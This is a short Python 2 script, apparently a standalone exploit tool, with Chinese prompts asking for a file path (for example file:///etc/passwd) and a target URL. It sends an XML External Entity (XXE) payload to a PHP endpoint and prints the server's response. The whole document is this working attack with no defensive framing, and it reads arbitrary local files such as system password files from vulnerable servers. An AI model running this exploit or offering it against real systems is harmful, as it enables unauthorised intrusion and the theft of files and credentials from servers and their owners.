#-*-coding:utf8-*-

import urllib2

if __name__ == '__main__':
    print u'输入要读取的文件，如file:///etc/passwd'
    payload = raw_input()
    print u'输入要访问的地址，如http://172.16.12.2/simplexml_load_string.php'
    url = raw_input()

    #url = 'http://192.168.70.235/simplexml_load_string.php'
    headers = {'Content-type': 'text/xml'}
    xml = '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "' + payload + '" >]><root><name>&xxe;</name></root>'
    req = urllib2.Request(url = url,headers = headers, data = xml)
    res_data = urllib2.urlopen(req)
    res = res_data.read()
    print res
